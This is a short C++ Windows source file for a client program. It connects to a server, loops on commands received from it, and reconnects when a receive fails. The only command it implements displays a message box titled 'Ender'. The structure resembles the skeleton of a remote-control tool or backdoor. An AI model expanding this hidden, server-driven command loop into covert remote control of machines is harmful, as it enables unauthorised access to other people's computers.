#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <Windows.h>
#include <WS2tcpip.h>
#include "client.h"
#include "main.h"

#pragma comment (lib, "Ws2_32.lib")

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int nCmdShow)
{
	init_winsock();
	CLIENT client;
	string command;
	while(command != "disconnect")
	{
		command.assign("");
		if(client.recieve_command(command) == false)
		{
			client.connect_to_server();
		}
		handle_command(command);
		Sleep(500);
	}
	return 0;
}

int init_winsock()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	return 0;
}

void handle_command(string& command)
{
	if(command.substr(0,5) == "show ")
	{
		MessageBoxA(NULL, command.c_str() + 5, "Ender", MB_OK);
	}
}